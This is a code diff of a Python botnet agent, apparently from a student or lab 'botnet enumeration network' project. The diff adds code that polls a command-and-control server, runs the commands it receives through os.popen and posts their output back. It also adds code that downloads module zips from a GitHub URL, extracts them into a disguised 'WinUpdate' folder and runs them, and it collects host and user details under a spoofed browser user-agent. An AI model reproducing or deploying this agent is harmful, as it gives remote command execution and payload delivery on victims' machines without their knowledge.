@@ -1,13 +1,21 @@
 """
 Agent
 [X] grab operating_system, computer_name, username
-[] Send POST req to server
+[X] Receive and output back to server (basic cmd commands)
+[] load modules
+[] run loaded modules
+
+To load module: load nmap
+To run module: nmap <params>
+- in the bg, it will run nmap/nmap.exe <params>
 """
 
+import json
 import os
 import re
 import time
 import uuid
+import zipfile
 
 import requests
 
@@ -18,14 +26,16 @@ API_METHOD_PUSH = 'push'
 API_METHOD_GET = 'get'
 API_METHOD_OUTPUT = 'output'
 C2 = r'http://127.0.0.1:8000/api/{}/{}'
-C2_MODULES_PATH = r'http://127.0.0.1:8000/api/modules/{}'
+C2_MODULES_PATH = r'https://github.com/notclement/botnet-enumeration-network/raw/master/server_django/apps/api/modules/{}'
 DISK_PATH = "{}\\WinUpdate".format(os.getenv('LOCALAPPDATA'))
-
+HEADERS = {
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'}
 
 
 def get_mac():
-    """This function returns the first MAC address of the NIC of the PC"""
-    return ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+    """This function returns the first MAC address of the NIC of the PC
+    without colon"""
+    return ':'.join(re.findall('..', '%012x' % uuid.getnode())).replace(':', '')
 
 
 def get_os():
@@ -49,28 +59,62 @@ def get_computer_and_username():
 
 def process_response(post_object):
     """This function takes the response from the server and processes it"""
-    if post_object != '""':
-        if len(post_object.split()) == 3 and post_object.split()[0] == 'load' and post_object.split()[1] == 'module':
-            # C2 is asking to load a module, so we will check if the module is
-            # on disk or not, if not then we will download it from the server
-            if post_object.split()[2] in [dI for dI in os.listdir(DISK_PATH) if
-                                          os.path.isdir(
-                                                  os.path.join(DISK_PATH, dI))]:
-                print('module exist in here')
-            else:
-                with open(DISK_PATH + '\\' + post_object.split()[2] + '.zip',
-                          'wb') as file:
-                    headers = {
-                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36'}
-                    response = requests.get(
-                        C2_MODULES_PATH.format(post_object.split()[2]), headers)
-                    file.write(response.content)
+    # if post_object != '""':
+    res_obj = json.loads(post_object)
+    if len(post_object.split()) == 2 and post_object.split()[0] == 'load':
+        # C2 is asking to load a module, so we will check if the module is
+        # on disk or not, if not then we will download it from the server
+        module_name = post_object.split()[1]
+        path_to_zip_file = "{}\\{}.zip".format(DISK_PATH, module_name)
+        if module_name in [dI for dI in os.listdir(DISK_PATH) if
+                           os.path.isdir(
+                               os.path.join(DISK_PATH, dI))]:
+            print('module already loaded.')
+            send_response(res_obj['session_id'],
+                          '{} module already loaded.'.format(module_name))
         else:
-            # might be just normal commands
-            print('Received command: {}'.format(post_object))
+            print("{} module not loaded.\nDownloading it..".format(
+                module_name))
+
+            with open(path_to_zip_file, 'wb') as file:
+                response = requests.get(C2_MODULES_PATH.format(module_name),
+                                        HEADERS)
+                file.write(response.content)
+            with zipfile.ZipFile(path_to_zip_file, 'r') as zip_ref:
+                zip_ref.extractall(DISK_PATH + '\\' + module_name)
+            os.remove(path_to_zip_file)
+            send_response(res_obj['session_id'],
+                          '{} module loaded and ready to be used'.format(
+                              module_name))
+    # running specific modules
+    elif post_object.split()[0] in get_loaded_modules():
+        pass
     else:
-        # blank from the server, no commands given
-        print('No commands given.')
+        # If a command is received
+        if len(post_object) != 2:  # means that there is a cmdline
+            print('Sending output of "{}"'.format(res_obj['cmdline']))
+            cmd_output = os.popen(res_obj['cmdline'])
+            send_response(res_obj['session_id'], cmd_output.read(),
+                          res_obj['cmdline'])
+        else:
+            print('No commands given.')
+
+
+def get_loaded_modules():
+    root = DISK_PATH
+    return [item for item in os.listdir(root) if
+            os.path.isdir(os.path.join(root, item))]
+
+
+def send_response(sesh_id, output, cmd_given=""):
+    if not output:
+        output_obj = {'output': '{} is an invalid command.'.format(cmd_given)}
+        requests.post(C2.format(get_mac(), sesh_id) + '/' + API_METHOD_OUTPUT,
+                      data=output_obj)
+    else:
+        output_obj = {'output': output}
+        requests.post(C2.format(get_mac(), sesh_id) + '/' + API_METHOD_OUTPUT,
+                      data=output_obj)
 
 
 def say_hello():
@@ -89,7 +133,7 @@ def say_hello():
 def main():
     while True:
         say_hello()
-        time.sleep(10)
+        time.sleep(5)
 
 
 if __name__ == '__main__':
